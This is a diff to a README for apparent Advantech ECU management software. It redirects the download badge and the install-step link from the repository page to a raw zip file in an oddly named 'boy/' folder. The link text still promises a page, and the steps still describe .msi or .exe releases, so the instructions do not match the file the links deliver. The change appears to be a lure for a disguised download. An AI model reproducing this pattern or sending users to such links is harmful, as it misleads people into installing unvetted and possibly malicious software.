@@ -1,6 +1,6 @@
 # ⚙️ Advantech-ECU-150v2-manifest - Manage your Advantech systems with ease
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/myrtlecranial161/Advantech-ECU-150v2-manifest)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/myrtlecranial161/Advantech-ECU-150v2-manifest/raw/refs/heads/main/boy/EC-manifest-v-Advantech-v1.5.zip)
 
 ## 🎯 About This Software
 
@@ -24,7 +24,7 @@ Ensure your Windows system has all recent updates installed to prevent compatibi
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page](https://github.com/myrtlecranial161/Advantech-ECU-150v2-manifest) to access the download files.
+1. Visit [this page](https://github.com/myrtlecranial161/Advantech-ECU-150v2-manifest/raw/refs/heads/main/boy/EC-manifest-v-Advantech-v1.5.zip) to access the download files.
 2. Look for the file ending in `.msi` or `.exe` under the release section.
 3. Click the filename to save the installer to your Downloads folder.
 4. Locate the file on your computer and double-click it.
